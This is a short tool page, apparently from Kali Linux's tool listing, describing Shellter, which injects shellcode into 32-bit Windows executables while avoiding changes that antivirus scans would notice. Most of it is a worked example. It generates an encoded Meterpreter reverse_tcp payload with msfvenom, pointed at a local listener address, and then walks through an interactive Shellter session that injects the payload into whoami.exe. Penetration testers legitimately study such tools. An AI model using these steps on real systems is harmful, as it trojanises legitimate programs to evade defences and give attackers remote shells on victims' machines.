# Shellter

[https://www.kali.org/tools/shellter/](https://www.kali.org/tools/shellter/)

Shellter is a dynamic shellcode injection tool aka dynamic PE infector. It can be used in order to inject shellcode into native Windows applications (currently 32-bit apps only). The shellcode can be something yours or something generated through a framework, such as Metasploit.

Shellter takes advantage of the original structure of the PE file and doesn’t apply any modification such as changing memory access permissions in sections (unless the user wants to), adding an extra section with RWE access, and whatever would look dodgy under an AV scan.

```
$ pwd
/tmp/shellter
$ cp /usr/share/windows-resources/binaries/whoami.exe .
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=80 -e x86/shikata_ga_nai -i 7 -f raw > met.bin

┌──(root💀kali)-[/usr/share/windows-resources/shellter]
└─# wine shellter.exe
A
/tmp/shellter/whoami.exe
Enable Stealth Mode? (Y/N/H): N
Use a listed payload or custom? (L/C/H): C
/tmp/shellter/met.bin
Is this payload a reflective DLL loader? (Y/N/H): N

whoami.exe
```
